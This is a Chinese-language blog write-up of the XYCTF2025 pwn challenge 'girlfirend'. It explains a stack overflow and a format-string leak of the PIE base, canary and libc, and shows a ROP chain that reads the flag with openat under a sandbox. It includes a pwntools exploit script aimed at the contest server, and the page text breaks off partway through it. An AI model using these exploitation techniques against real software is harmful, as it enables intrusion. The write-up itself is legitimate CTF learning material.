<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>赛题合集 | mint1.</title><meta name="author" content="mint"><meta name="copyright" content="mint"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="国内比赛XYCTF2025girlfirendcheck发现保护全开，有菜单但是似乎不是堆题 发现有system(&quot;echo &#x2F;flag&quot;); 但是没有&#x2F;bin&#x2F;sh 解析各个选择 1： 123456789101112131415161718192021__int64 lll1()&#123;  char buf[56]; &#x2F;&#x2F; [rsp+0h] [rbp-">
<meta property="og:type" content="article">
<meta property="og:title" content="赛题合集">
<meta property="og:url" content="http://cdu-mint.github.io/2025/04/05/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/index.html">
<meta property="og:site_name" content="mint1.">
<meta property="og:description" content="国内比赛XYCTF2025girlfirendcheck发现保护全开，有菜单但是似乎不是堆题 发现有system(&quot;echo &#x2F;flag&quot;); 但是没有&#x2F;bin&#x2F;sh 解析各个选择 1： 123456789101112131415161718192021__int64 lll1()&#123;  char buf[56]; &#x2F;&#x2F; [rsp+0h] [rbp-">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://cdu-mint.github.io/images/Decoration/%E9%9B%85.jpg">
<meta property="article:published_time" content="2025-04-05T08:49:12.000Z">
<meta property="article:modified_time" content="2025-04-20T07:44:27.332Z">
<meta property="article:author" content="mint">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://cdu-mint.github.io/images/Decoration/%E9%9B%85.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://cdu-mint.github.io/2025/04/05/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":230},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Error',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '赛题合集',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-04-20 15:44:27'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">28</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/images/Decoration/%E9%9B%85.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="mint1."><span class="site-name">mint1.</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">赛题合集</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-04-05T08:49:12.000Z" title="Created 2025-04-05 16:49:12">2025-04-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-04-20T07:44:27.332Z" title="Updated 2025-04-20 15:44:27">2025-04-20</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="赛题合集"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="国内比赛"><a href="#国内比赛" class="headerlink" title="国内比赛"></a>国内比赛</h1><h2 id="XYCTF2025"><a href="#XYCTF2025" class="headerlink" title="XYCTF2025"></a>XYCTF2025</h2><h3 id="girlfirend"><a href="#girlfirend" class="headerlink" title="girlfirend"></a>girlfirend</h3><p>check发现保护全开，有菜单但是似乎不是堆题</p>
<p>发现有<code>system(&quot;echo /flag&quot;); </code>但是没有&#x2F;bin&#x2F;sh</p>
<p>解析各个选择</p>
<p>1：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">lll1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">56</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( dword_4094 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You have already tried to talk to her, and she left...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    dword_4094 = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Girl is very beautiful!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;what do you want to say to her?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x50</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You say: %s\n&quot;</span>, buf);               <span class="comment">// 泄露canary或者libc</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;but she left.........&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现有栈溢出漏洞，<del>后接printf可以利用该处输出canary的值</del>，因为canary的低字节一般是\x00会将%s截断<del>但是不确定在调用另一个函数后该值是否发生改变</del>Canary 值在程序运行时是固定的，不会随着函数调用而改变。</p>
<p>2：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">get_flag2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you want to buy her flowers?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Y/N&quot;</span>);</span><br><span class="line">  v1 = getchar();</span><br><span class="line">  <span class="keyword">while</span> ( getchar() != <span class="number">10</span> )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="string">&#x27;Y&#x27;</span> || v1 == <span class="string">&#x27;y&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( dword_4090 &lt;= <span class="number">200</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;you don&#x27;t have enough money&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You did it!\n&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;echo /flag&quot;</span>);                     <span class="comment">// 拿flag</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;what a pity!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关键函数，如果输入Y且dword_4090&gt;200即可到达system函数，但是此处不能直接输出flag或者提权也没有&#x2F;bin&#x2F;sh想尝试将其参数传为&#x2F;bin&#x2F;sh</p>
<p>3：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">lll3</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( dword_4098 &lt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ++dword_4098;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You should tell her your name first&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You also get her name: XM&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good luck!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You can only introduce yourself twice.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数也存在溢出可用其修改dword_4090的值使其能运行到system函数，存在格式化字符串漏洞，可以把&#x2F;bin&#x2F;sh写到bss段用该处泄露基地址(因为开了PIE bss段的地址无法确定)</p>
<p>4没啥用</p>
<p>开了沙箱：</p>
<p>注意在调用read时fd也就是第一个参数只能等于0所以得先用close(0)关闭标准输入，使得在read(0,xxx,xxx)时文件指针0能够重定向到opeanat()所打开的那个文件使得flag正常读入</p>
<p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/xy1.png" alt="1"></p>
<p>大致思路目前是这样的，首先利用3测格式化字符的偏移尝试输出elf基地址绕过PIE，输出canary，输出函数真实地址拿到libc，接着利用3构造rop链因为没有&#x2F;bin&#x2F;sh且禁用了execve所以选择用orw，但是opean也被禁用了但可以用opeanat代替，最后用1进行栈迁移到利用3布置的rop链上</p>
<p>注意在开启了PIE之后gdb调试时无法直接在main函数处下断点需要借助<code>b *$rebase(要下断点的偏移)</code>当然得先让程序跑起来，ida中显示的地址即为偏移</p>
<p>canary：</p>
<p>printf处存在格式化字符漏洞，可以通过输入改变printf调用时rdi的值也就是格式字符串，printf的格式字符串防在rdi中，后续对应的参数前5个放在寄存器里，也就是<code>RSI RDX RCX R8 R9</code>后续参数存放到栈上由低地址到高地址。</p>
<p>调用printf函数时的寄存器情况以及栈情况：</p>
<p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/XY3.png" alt="1"></p>
<p>可以发现rdi成功变成了我们输入的格式字符，RSI RDX R8 R9中的内容都没有我们想要的那么看栈上的</p>
<p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/Snipaste_2025-04-10_09-18-39.png" alt="1"></p>
<p>可以发现第7个参数是mov edi，1的地址可以用这个泄露elf基地址，我们用泄露出来的地址减去该汇编对应偏移就是基地址</p>
<p>IDA中找到该条汇编，偏移为0x18D9</p>
<p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/Snipaste_2025-04-10_09-37-08.png" alt="1"></p>
<p>第15个很明显是canary的值因为低字节是’\x00’，为什么确定canary是该处的值呢我们调用1再来看看栈上确定该canary</p>
<p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/Snipaste_2025-04-10_09-25-28.png" alt="1"></p>
<p>这里运行到1中获取输入后，可以看到栈上0x7fffffffdfc8对应的值即为canary，因为其在rbp-8处</p>
<p>ibc基址我们选择用第17个参数也就是(__libc_start_call_main+128)的地址先输出一次获取后三位，再通过网址寻找对应libc版本。注意我们只能用__libc_start_call_main搜所以要将得到的后三位减去128</p>
<p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/Snipaste_2025-04-10_19-25-47.png" alt="1"></p>
<p>故为0xD90-128&#x3D;0xD10搜索到实际为这个<a target="_blank" rel="noopener" href="https://libc.blukat.me/?q=__libc_start_call_main:D10&l=libc-2.40.9000-23.fc42.i686">libc database search</a></p>
<p>但是此处找libc基址反而是用的mov edi,eax这条指令的偏移来找的，我尝试用__libc_start_call_main的偏移来定基地址但是打不通，怪怪的，而<code>mov edi,eax</code>我用ROPgadget去找没找到只有用IDA打开libc文件一个个去试试出来其对应偏移为0x29D90</p>
<p>所以我们的格式字符即为<code>%7$p_%15$p_%17$p</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">io.sendlineafter(<span class="string">&quot;Your Choice:\n&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;You should tell her your name first&quot;</span>,<span class="string">b&#x27;%7$p...%15$p...%17$p...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;\nyour name:\n&#x27;</span>)</span><br><span class="line">elf_base = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;...&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-<span class="number">0x18D9</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;pie&gt;&gt;&gt;&#x27;</span>+<span class="built_in">hex</span>(elf_base).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">canary = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;...&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;canary&gt;&gt;&gt;&#x27;</span>+<span class="built_in">hex</span>(canary).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;...&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-<span class="number">0x29D90</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;libc&gt;&gt;&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>接着再次用3来构造rop链</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">payload = flat([</span><br><span class="line">    <span class="string">&#x27;flag\x00\x00\x00\x00&#x27;</span>,<span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,pop_rdi_ret,</span><br><span class="line">    <span class="number">0</span>,close_addr,</span><br><span class="line">    pop_rdi_ret,-<span class="number">100</span>,</span><br><span class="line">    pop_rsi_ret,bss_addr,</span><br><span class="line">    pop_rdx_r_ret,<span class="number">0x0</span>,<span class="number">0</span>,</span><br><span class="line">    opnat_addr,</span><br><span class="line">    pop_rdi_ret,<span class="number">0</span>,</span><br><span class="line">    pop_rdx_r_ret,<span class="number">0x100</span>,<span class="number">0</span>,</span><br><span class="line">    read_addr,</span><br><span class="line">    pop_rdi_ret,<span class="number">1</span>,</span><br><span class="line">    pop_rdx_r_ret,<span class="number">0x100</span>,<span class="number">0</span>,</span><br><span class="line">    pop_rax_ret,<span class="number">1</span>,</span><br><span class="line">    write_addr,</span><br><span class="line">    ])</span><br></pre></td></tr></table></figure>

<p>首先将’flag’填充到8个字节压到byte_4060处后面的6个零是为了不将关键ROP覆盖到那几个bss段上的全局变量上防止后面运行不起来，加上flag总共0x38个字节，接着就是orw</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">close(0)</span><br><span class="line">opeanat(-100,bss_addr,0) //-100表示当前工作目录</span><br><span class="line">read(0,bss_addr,0x100)</span><br><span class="line">write(1,bss_addr,0x100)</span><br></pre></td></tr></table></figure>

<p>注意rop链刚好100字节不能用sendline发送会多一个字节，所以我们都使用send发送</p>
<p>最后就是栈迁移了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(canary) + p64(bss_addr+<span class="number">0x30</span>)+p64(leave_ret)</span><br></pre></td></tr></table></figure>

<p>因为迁移后rsp会在rbp基础上+8所以rbp只设置为bss_addr+0x30</p>
<p>2025-4-10浮现了7-8个小时第一次浮现出全保护的题并且全部搞懂非常开心~~</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;gz.imxbt.cn&#x27;</span>,<span class="number">20623</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc2.so&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Your Choice:\n&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;You should tell her your name first&quot;</span>,<span class="string">b&#x27;%7$p...%15$p...%17$p...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;\nyour name:\n&#x27;</span>)</span><br><span class="line">elf_base = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;...&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-<span class="number">0x18D9</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;pie&gt;&gt;&gt;&#x27;</span>+<span class="built_in">hex</span>(elf_base).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">canary = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;...&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;canary&gt;&gt;&gt;&#x27;</span>+<span class="built_in">hex</span>(canary).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;...&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-<span class="number">0x29D90</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;libc&gt;&gt;&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss_addr = elf_base + <span class="number">0x004060</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span><span class="comment">#: pop rdi; ret;</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x0000000000130202</span><span class="comment">#: pop rsi; ret;</span></span><br><span class="line">pop_rdx_r_ret = libc_base + <span class="number">0x000000000011f2e7</span><span class="comment">#: pop rdx; pop r12; ret; </span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000045eb0</span><span class="comment">#: pop rax; ret; </span></span><br><span class="line">pop_rcx_ret = libc_base + <span class="number">0x000000000003d1ee</span><span class="comment">#: pop rcx; ret;</span></span><br><span class="line">syscall_ret = libc_base + <span class="number">0x0000000000091316</span><span class="comment">#: syscall; ret;</span></span><br><span class="line">leave_ret = libc_base + <span class="number">0x000000000004da83</span><span class="comment">#: leave; ret; </span></span><br><span class="line">opnat_addr = libc_base + libc.sym[<span class="string">&#x27;openat&#x27;</span>]</span><br><span class="line">read_addr = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">close_addr = libc_base + libc.sym[<span class="string">&#x27;close&#x27;</span>] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">    <span class="string">&#x27;flag\x00\x00\x00\x00&#x27;</span>,<span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,pop_rdi_ret,</span><br><span class="line">    <span class="number">0</span>,close_addr,</span><br><span class="line">    pop_rdi_ret,-<span class="number">100</span>,</span><br><span class="line">    pop_rsi_ret,bss_addr,</span><br><span class="line">    pop_rdx_r_ret,<span class="number">0x0</span>,<span class="number">0</span>,</span><br><span class="line">    opnat_addr,</span><br><span class="line">    pop_rdi_ret,<span class="number">0</span>,</span><br><span class="line">    